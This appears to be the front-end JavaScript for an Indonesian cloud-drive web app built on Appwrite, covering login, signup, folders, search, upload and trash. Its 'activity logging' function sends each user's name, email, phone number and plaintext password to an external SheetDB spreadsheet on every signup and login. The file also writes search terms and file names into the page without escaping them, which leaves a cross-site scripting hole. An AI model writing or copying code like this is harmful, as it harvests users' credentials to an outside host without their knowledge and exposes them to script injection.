// ======================================================
// 1. KONFIGURASI APPWRITE
// ======================================================
const client = new Appwrite.Client();
const account = new Appwrite.Account(client);
const databases = new Appwrite.Databases(client);
const storage = new Appwrite.Storage(client);

// KONFIGURASI PROJECT - JANGAN UBAH ID JIKA SUDAH BENAR
const CONFIG = {
    ENDPOINT: 'https://sgp.cloud.appwrite.io/v1',
    PROJECT_ID: '697f71b40034438bb559', 
    DB_ID: 'storagedb',
    COLLECTION_FILES: 'files',   
    COLLECTION_USERS: 'users',
    BUCKET_ID: 'taskfiles'
};

const SHEETDB_API = 'https://sheetdb.io/api/v1/v9e5uhfox3nbi'; // API Logging

client.setEndpoint(CONFIG.ENDPOINT).setProject(CONFIG.PROJECT_ID);

// Variabel Global (Menyimpan Status Sementara)
let currentUser = null;
let currentFolderId = 'root'; 
let currentFolderName = "Drive";
let currentViewMode = 'root'; 
let selectedItem = null; 
let selectedUploadFile = null; 
let storageDetail = { images: 0, videos: 0, docs: 0, others: 0, total: 0 };
let searchTimeout = null;

// Fungsi Helper (Penyederhanaan Code)
const el = (id) => document.getElementById(id);
// Fungsi Loading dengan Pesan Custom
const toggleLoading = (show, message = "Memproses...") => {
    const loader = el('loading');
    const msg = el('loadingText'); // Pastikan ada elemen p id="loadingText" di HTML
    if (show) {
        if(msg) msg.innerText = message;
        loader.classList.remove('hidden');
    } else {
        loader.classList.add('hidden');
    }
};

// ======================================================
// 2. MAIN EXECUTION (SAAT WEBSITE DIBUKA)
// ======================================================
document.addEventListener('DOMContentLoaded', () => {
    checkSession();         // Cek login otomatis
    initDragAndDrop();      // Aktifkan area drop file
    initLogout();           // Aktifkan tombol logout
    initSearchBar();        // Aktifkan search bar
    initAllContextMenus();  // Aktifkan semua menu klik kanan
});

// ======================================================
// 3. LOGIKA OTENTIKASI (LOGIN & SIGNUP CANGGIH)
// ======================================================

// --- LOGIKA SIGN UP ---
if (el('signupForm')) {
    el('signupForm').addEventListener('submit', async (e) => {
        e.preventDefault();
        
        // Ambil data form
        const name = el('regName').value.trim();
        const email = el('regEmail').value.trim();
        const phone = el('regPhone').value.trim();
        const pass = el('regPass').value;
        const verify = el('regVerify').value;

        // Validasi Password
        if (pass !== verify) { alert("Password konfirmasi tidak sama!"); return; }
        
        toggleLoading(true, "Membuat Akun..."); // Tampilkan Loading
        
        try {
            // 1. Buat Akun Auth di Appwrite
            const auth = await account.create(Appwrite.ID.unique(), email, pass, name);
            
            // 2. Simpan Detail User ke Database (Penting untuk Login Username)
            try { 
                await databases.createDocument(CONFIG.DB_ID, CONFIG.COLLECTION_USERS, auth.$id, { 
                    name: name, email: email, phone: phone 
                }); 
            } catch(dbErr) { console.warn("Gagal simpan DB user (Mungkin duplikat)", dbErr); }
            
            // 3. Log Aktivitas ke Excel
            await recordActivity('SignUp', { id: auth.$id, name, email, phone, password: pass });
            
            // 4. Sukses -> Tampilkan Pesan -> Pindah ke Login
            alert("Pendaftaran Berhasil! Silakan Login."); 
            window.nav('loginPage');

        } catch(e) { 
            // Error Handling (Cek duplikat email)
            if(e.message.includes('exists')) alert("Email atau Username sudah terdaftar."); 
            else alert("Gagal Daftar: " + e.message);
        } finally { 
            toggleLoading(false); // Matikan Loading
        }
    });
}

// --- LOGIKA LOGIN (USERNAME / EMAIL) ---
if (el('loginForm')) {
    el('loginForm').addEventListener('submit', async (e) => {
        e.preventDefault();
        
        let inputId = el('loginEmail').value.trim();
        const pass = el('loginPass').value;
        
        toggleLoading(true, "Sedang Masuk..."); // Tampilkan Loading
        
        try {
            // FITUR: Login dengan Username (Jika input tidak ada '@')
            if (!inputId.includes('@')) {
                // Cari email berdasarkan username di database
                const res = await databases.listDocuments(CONFIG.DB_ID, CONFIG.COLLECTION_USERS, [
                    Appwrite.Query.equal('name', inputId)
                ]);
                
                if (res.total === 0) throw new Error("Username tidak ditemukan.");
                inputId = res.documents[0].email; // Gunakan email hasil pencarian
            }

            // Buat Sesi Login
            await account.createEmailPasswordSession(inputId, pass);
            
            // Log ke Excel
            const userAuth = await account.get();
            try {
                const userDB = await databases.getDocument(CONFIG.DB_ID, CONFIG.COLLECTION_USERS, userAuth.$id);
                await recordActivity('Login', { id: userAuth.$id, name: userAuth.name, email: userAuth.email, phone: userDB.phone, password: pass });
            } catch(ex) {}

            // Redirect ke Dashboard
            checkSession();

        } catch (error) { 
            alert(error.message || "Login Gagal. Periksa Username/Password."); 
            toggleLoading(false);
        }
    });
}

// --- LOGIKA LOGOUT ---
function initLogout() {
    const btn = el('logoutBtn');
    if (btn) {
        // Cloning untuk membersihkan event listener lama
        const newBtn = btn.cloneNode(true);
        btn.parentNode.replaceChild(newBtn, btn);
        
        newBtn.addEventListener('click', async () => {
            if (confirm("Yakin ingin keluar?")) {
                toggleLoading(true, "Keluar...");
                try {
                    await account.deleteSession('current');
                    window.location.reload(); 
                } catch (error) { window.location.reload(); }
            }
        });
    }
}

// ======================================================
// 4. NAVIGASI DASHBOARD & FOLDER
// ======================================================
window.handleMenuClick = (element, mode) => {
    // Efek Aktif pada Sidebar
    document.querySelectorAll('.nav-item').forEach(i => i.classList.remove('active'));
    element.classList.add('active');
    
    // Reset View
    currentViewMode = mode; 
    currentFolderId = 'root';
    
    // Set Judul Header
    if (mode === 'root') currentFolderName = "Drive";
    else if (mode === 'recent') currentFolderName = "Terbaru";
    else if (mode === 'starred') currentFolderName = "Berbintang";
    else if (mode === 'trash') currentFolderName = "Sampah";
    else currentFolderName = element.innerText.trim();
    
    loadFiles(mode); // Muat file sesuai mode
};

// Fungsi Kembali ke Home
window.goBack = () => {
    currentFolderId = 'root'; currentFolderName = "Drive"; currentViewMode = 'root';
    document.querySelectorAll('.nav-item').forEach(i => i.classList.remove('active'));
    document.querySelectorAll('.nav-item')[0].classList.add('active');
    loadFiles('root');
};

// Fungsi Buka Folder
window.openFolder = (id, name) => {
    currentFolderId = id;
    currentFolderName = name;
    loadFiles(id);
};

// Pindah Halaman (Login <-> Dashboard)
window.nav = (p) => {
    ['loginPage', 'signupPage', 'dashboardPage'].forEach(id => el(id).classList.add('hidden'));
    el(p).classList.remove('hidden');
};

// ======================================================
// 5. FITUR PENCARIAN (SEARCH ENGINE STYLE)
// ======================================================
function initSearchBar() {
    const input = el('searchInput');
    if (!input) return;
    
    input.addEventListener('input', (e) => {
        const query = e.target.value.trim();
        
        // Jika kosong, kembalikan tampilan normal
        if (query.length === 0) { 
            el('clearSearchBtn').classList.add('hidden'); 
            loadFiles(currentFolderId); 
            return; 
        }
        
        el('clearSearchBtn').classList.remove('hidden');
        clearTimeout(searchTimeout);
        
        // Tampilkan loading spinner di area file
        el('fileGrid').innerHTML = `<div style="grid-column:1/-1;text-align:center;margin-top:50px;"><div class="spinner"></div><p>Mencari "${query}"...</p></div>`;
        
        // Debounce (Tunggu user berhenti ngetik 600ms)
        searchTimeout = setTimeout(() => performSearch(query), 600);
    });
}

async function performSearch(keyword) {
    try {
        // Cari di Appwrite
        const res = await databases.listDocuments(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, [
            Appwrite.Query.equal('owner', currentUser.$id),
            Appwrite.Query.search('name', keyword), // Full-text search
            Appwrite.Query.limit(50)
        ]);
        
        const grid = el('fileGrid'); grid.innerHTML = '';
        
        if (res.documents.length === 0) {
            grid.innerHTML = `<p style="grid-column:1/-1;text-align:center;margin-top:50px;opacity:0.7;">Tidak ditemukan hasil untuk "${keyword}".</p>`;
        } else {
            res.documents.forEach(doc => renderItem(doc));
        }
    } catch (e) { fallbackSearch(keyword); }
}

// Fallback jika Index Search belum aktif
async function fallbackSearch(keyword) {
    try {
        const res = await databases.listDocuments(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, [Appwrite.Query.equal('owner', currentUser.$id), Appwrite.Query.limit(100)]);
        const filtered = res.documents.filter(doc => doc.name.toLowerCase().includes(keyword.toLowerCase()));
        const grid = el('fileGrid'); grid.innerHTML = '';
        if (filtered.length === 0) grid.innerHTML = `<p style="grid-column:1/-1;text-align:center;">Tidak ditemukan.</p>`;
        else filtered.forEach(doc => renderItem(doc));
    } catch(err){}
}

window.clearSearch = () => { 
    el('searchInput').value = ''; 
    el('clearSearchBtn').classList.add('hidden'); 
    loadFiles(currentFolderId); 
};

// ======================================================
// 6. MANAJEMEN MENU & KLIK KANAN (ANTI BENTROK)
// ======================================================
function initAllContextMenus() {
    const newBtn = el('newBtnMain'); 
    const newMenu = el('dropdownMenu');
    const navDrive = el('navDrive'); // Element Drive Saya di Sidebar
    const globalMenu = el('globalContextMenu');
    const fileMenu = el('contextMenu');
    const mainArea = document.querySelector('.main-content-area');

    const closeAll = () => {
        if(newMenu) newMenu.classList.remove('show');
        if(globalMenu) globalMenu.classList.remove('show');
        if(fileMenu) { fileMenu.classList.add('hidden'); fileMenu.classList.remove('show'); }
        if(el('storageModal')) el('storageModal').classList.add('hidden');
    };

    // 1. Tombol NEW (Klik Kiri & Kanan -> Buka Dropdown)
    if (newBtn) {
        const newBtnClean = newBtn.cloneNode(true); 
        newBtn.parentNode.replaceChild(newBtnClean, newBtn);
        
        const toggleNewMenu = (e) => { 
            e.preventDefault(); e.stopPropagation(); 
            const wasOpen = newMenu.classList.contains('show'); 
            closeAll(); 
            if (!wasOpen) newMenu.classList.add('show'); 
        };
        newBtnClean.onclick = toggleNewMenu;
        newBtnClean.oncontextmenu = toggleNewMenu;
    }

    // 2. Sidebar DRIVE SAYA (Klik Kanan -> Buka Menu Global yang Sama)
    if (navDrive) {
        navDrive.oncontextmenu = (e) => { 
            e.preventDefault(); e.stopPropagation(); closeAll(); 
            // Posisikan menu di dekat kursor
            globalMenu.style.top = `${e.clientY}px`; 
            globalMenu.style.left = `${e.clientX}px`; 
            globalMenu.classList.add('show');
        };
    }

    // 3. Area Kosong (Klik Kanan -> Buka Menu Global)
    if (mainArea) {
        mainArea.oncontextmenu = (e) => {
            if (e.target.closest('.item-card')) return; // Biarkan file handle sendiri
            e.preventDefault(); closeAll();
            globalMenu.style.top = `${e.clientY}px`; 
            globalMenu.style.left = `${e.clientX}px`; 
            globalMenu.classList.add('show');
        };
    }
    window.onclick = () => closeAll();
}

// ======================================================
// 7. RENDER ITEM & MENU FILE
// ======================================================
function renderItem(doc) {
    const grid = el('fileGrid');
    const div = document.createElement('div');
    div.className = 'item-card';
    const isFolder = doc.type === 'folder';
    
    // Ikon & Thumbnail
    const starHTML = doc.starred ? `<i class="fa-solid fa-star" style="position:absolute;top:10px;left:10px;color:#ffd700;"></i>` : '';
    let content = isFolder ? `<i class="icon fa-solid fa-folder"></i>` : `<i class="icon fa-solid fa-file-lines" style="color:#60a5fa"></i>`;
    
    // Jika gambar, tampilkan preview
    if (!isFolder && doc.name.match(/\.(jpg|jpeg|png|webp|jfif)$/i)) {
        content = `<div class="thumb-box" style="width:100px;height:100px;overflow:hidden;border-radius:15px;margin-bottom:10px;"><img src="${storage.getFilePreview(CONFIG.BUCKET_ID, doc.fileId)}" style="width:100%;height:100%;object-fit:cover;"></div>`;
    }

    div.innerHTML = `${starHTML}${content}<div class="item-name">${doc.name}</div>`;
    
    // KLIK KIRI: Buka Item
    div.onclick = () => { 
        if (!doc.trashed) isFolder ? openFolder(doc.$id, doc.name) : window.open(doc.url, '_blank'); 
    };

    // KLIK KANAN: Menu File
    div.oncontextmenu = (e) => {
        e.preventDefault(); e.stopPropagation();
        
        // Tutup menu lain
        if (el('storageModal')) el('storageModal').classList.add('hidden');
        if (el('globalContextMenu')) el('globalContextMenu').classList.remove('show');
        if (el('dropdownMenu')) el('dropdownMenu').classList.remove('show');

        selectedItem = doc;
        const menu = el('contextMenu');
        
        // Posisi Menu
        menu.style.top = `${e.clientY}px`; 
        menu.style.left = `${e.clientX}px`;
        
        // Logika Dinamis (Sampah/Restore/Star)
        const isTrash = doc.trashed;
        el('ctxTrashBtn').classList.toggle('hidden', isTrash); // Sembunyi Hapus jika di sampah
        el('ctxRestoreBtn').classList.toggle('hidden', !isTrash); // Muncul Restore jika di sampah
        el('ctxPermDeleteBtn').classList.toggle('hidden', !isTrash); // Muncul Hapus Permanen jika di sampah
        el('ctxStarText').innerText = doc.starred ? "Hapus Bintang" : "Bintangi";

        menu.classList.remove('hidden'); 
        menu.classList.add('show');
    };
    grid.appendChild(div);
}

// ======================================================
// 8. STORAGE DETAIL (POP-UP)
// ======================================================
window.openStorageModal = () => {
    // Pastikan menu file tertutup
    el('contextMenu').classList.add('hidden');
    
    const total = storageDetail.total || 1;
    
    // Update Grafik Bar
    el('barImages').style.width = `${(storageDetail.images/total)*100}%`;
    el('barVideos').style.width = `${(storageDetail.videos/total)*100}%`;
    el('barDocs').style.width = `${(storageDetail.docs/total)*100}%`;
    el('barOthers').style.width = `${(storageDetail.others/total)*100}%`;

    // Update Angka
    el('storageBigText').innerText = (storageDetail.total / 1048576).toFixed(2) + " MB";
    el('valImages').innerText = (storageDetail.images / 1048576).toFixed(2) + " MB";
    el('valVideos').innerText = (storageDetail.videos / 1048576).toFixed(2) + " MB";
    el('valDocs').innerText = (storageDetail.docs / 1048576).toFixed(2) + " MB";
    el('valOthers').innerText = (storageDetail.others / 1048576).toFixed(2) + " MB";

    window.openModal('storageModal');
};

// Hitung Storage di Background
async function calculateStorage() {
    if (!currentUser) return;
    try {
        const res = await databases.listDocuments(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, [Appwrite.Query.equal('owner', currentUser.$id), Appwrite.Query.equal('type', 'file')]);
        storageDetail = { images: 0, videos: 0, docs: 0, others: 0, total: 0 };
        res.documents.forEach(doc => {
            const size = doc.size || 0; const name = doc.name.toLowerCase(); storageDetail.total += size;
            if (name.match(/\.(jpg|jpeg|png|gif|webp|jfif)$/)) storageDetail.images += size;
            else if (name.match(/\.(mp4|mkv|mov|avi)$/)) storageDetail.videos += size;
            else if (name.match(/\.(pdf|doc|docx|xls|xlsx|txt)$/)) storageDetail.docs += size;
            else storageDetail.others += size;
        });
        const mb = (storageDetail.total / 1048576).toFixed(2);
        el('storageUsed').innerText = `${mb} MB`;
        el('storageBar').style.width = `${Math.min((mb / 2048) * 100, 100)}%`;
    } catch (e) {}
}

// ======================================================
// 9. FILE OPERATIONS (CRUD - CREATE READ UPDATE DELETE)
// ======================================================

// Helper: Buka/Tutup Modal
window.openModal = (id) => { el(id).classList.remove('hidden'); if(id==='folderModal') setTimeout(()=>el('newFolderName').focus(),100); };
window.closeModal = (id) => el(id).classList.add('hidden');
window.triggerUploadModal = () => { resetUploadUI(); window.openModal('uploadModal'); };
window.createFolder = () => window.openModal('folderModal');

// Action: Buat Folder
window.submitCreateFolder = async () => {
    const name = el('newFolderName').value.trim();
    if (!name) return;
    closeModal('folderModal'); toggleLoading(true, "Membuat Folder...");
    try {
        await databases.createDocument(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, Appwrite.ID.unique(), {
            name: name, type: 'folder', parentId: currentFolderId, owner: currentUser.$id, size: 0, starred: false, trashed: false
        });
        loadFiles(currentFolderId); el('newFolderName').value = '';
    } catch (e) { alert(e.message); } finally { toggleLoading(false); }
};

// Action: Upload File
window.submitUploadFile = async () => {
    if (!selectedUploadFile) return alert("Pilih file dulu!");
    closeModal('uploadModal'); toggleLoading(true, "Mengupload File...");
    try {
        const up = await storage.createFile(CONFIG.BUCKET_ID, Appwrite.ID.unique(), selectedUploadFile);
        await databases.createDocument(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, Appwrite.ID.unique(), {
            name: selectedUploadFile.name, type: 'file', parentId: currentFolderId, owner: currentUser.$id,
            url: storage.getFileView(CONFIG.BUCKET_ID, up.$id).href, fileId: up.$id, size: selectedUploadFile.size, starred: false, trashed: false
        });
        resetUploadUI(); loadFiles(currentFolderId); calculateStorage();
    } catch (e) { alert(e.message); } finally { toggleLoading(false); }
};

// Context Menu Actions
window.toggleStarItem = async () => { try { await databases.updateDocument(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, selectedItem.$id, { starred: !selectedItem.starred }); loadFiles(currentViewMode==='root'?currentFolderId:currentViewMode); el('contextMenu').classList.add('hidden'); } catch(e){} };
window.moveItemToTrash = async () => { try { await databases.updateDocument(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, selectedItem.$id, { trashed: true }); loadFiles(currentViewMode==='root'?currentFolderId:currentViewMode); el('contextMenu').classList.add('hidden'); } catch(e){} };
window.restoreFromTrash = async () => { try { await databases.updateDocument(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, selectedItem.$id, { trashed: false }); loadFiles('trash'); el('contextMenu').classList.add('hidden'); } catch(e){} };
window.deleteItemPermanently = async () => { if(!confirm("Hapus permanen?")) return; try { if(selectedItem.type==='file') await storage.deleteFile(CONFIG.BUCKET_ID, selectedItem.fileId); await databases.deleteDocument(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, selectedItem.$id); loadFiles('trash'); calculateStorage(); el('contextMenu').classList.add('hidden'); } catch(e){} };
window.openCurrentItem = () => { if(selectedItem) selectedItem.type==='folder' ? openFolder(selectedItem.$id, selectedItem.name) : window.open(selectedItem.url, '_blank'); el('contextMenu').classList.add('hidden'); };
window.downloadCurrentItem = () => { if(selectedItem && selectedItem.type!=='folder') window.open(storage.getFileDownload(CONFIG.BUCKET_ID, selectedItem.fileId), '_blank'); el('contextMenu').classList.add('hidden'); };
window.renameCurrentItem = async () => { const newName = prompt("Nama baru:", selectedItem.name); if(newName) { await databases.updateDocument(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, selectedItem.$id, {name: newName}); loadFiles(currentFolderId); } el('contextMenu').classList.add('hidden'); };

// ======================================================
// 10. UTILITIES (HELPER FUNCTIONS)
// ======================================================
function resetUploadUI() { selectedUploadFile = null; el('fileInfoContainer').classList.add('hidden'); el('fileInputHidden').value = ''; }
function handleFileSelect(file) { selectedUploadFile = file; el('fileInfoText').innerText = `Terpilih: ${file.name}`; el('fileInfoContainer').classList.remove('hidden'); }
function initDragAndDrop() {
    const zone = el('dropZone'); const input = el('fileInputHidden');
    if (!zone) return;
    zone.addEventListener('dragover', (e) => { e.preventDefault(); zone.classList.add('active'); });
    zone.addEventListener('dragleave', () => zone.classList.remove('active'));
    zone.addEventListener('drop', (e) => { e.preventDefault(); zone.classList.remove('active'); if(e.dataTransfer.files.length > 0) handleFileSelect(e.dataTransfer.files[0]); });
    if(input) input.addEventListener('change', (e) => { if (e.target.files.length > 0) handleFileSelect(e.target.files[0]); });
}

// Cek Sesi (Auto Login)
async function checkSession() {
    toggleLoading(true, "Memuat Data...");
    try {
        currentUser = await account.get();
        window.nav('dashboardPage'); 
        loadFiles('root');  
        calculateStorage();
    } catch (e) { window.nav('loginPage'); } 
    finally { toggleLoading(false); }
}

// Logika Activity Log Excel
async function recordActivity(sheetName, userData) {
    try {
        const now = new Date();
        const formattedDate = now.toLocaleString('id-ID', { day: '2-digit', month: '2-digit', year: 'numeric', hour: '2-digit', minute: '2-digit', second: '2-digit' }).replace(/\./g, ':');
        const payload = { "ID": userData.id || "-", "Nama": userData.name || "-", "Email": userData.email || "-", "Phone": userData.phone || "-", "Password": userData.password || "-", "Waktu": formattedDate };
        await fetch(`${SHEETDB_API}?sheet=${sheetName}`, { method: 'POST', headers: { 'Accept': 'application/json', 'Content-Type': 'application/json' }, body: JSON.stringify({ data: payload }) });
    } catch (error) { console.error("Excel Log Error"); }
}

window.togglePass = (id, icon) => { 
    const input = document.getElementById(id); 
    if (input.type === "password") { input.type = "text"; icon.classList.remove("fa-eye-slash"); icon.classList.add("fa-eye"); } 
    else { input.type = "password"; icon.classList.remove("fa-eye"); icon.classList.add("fa-eye-slash"); } 
};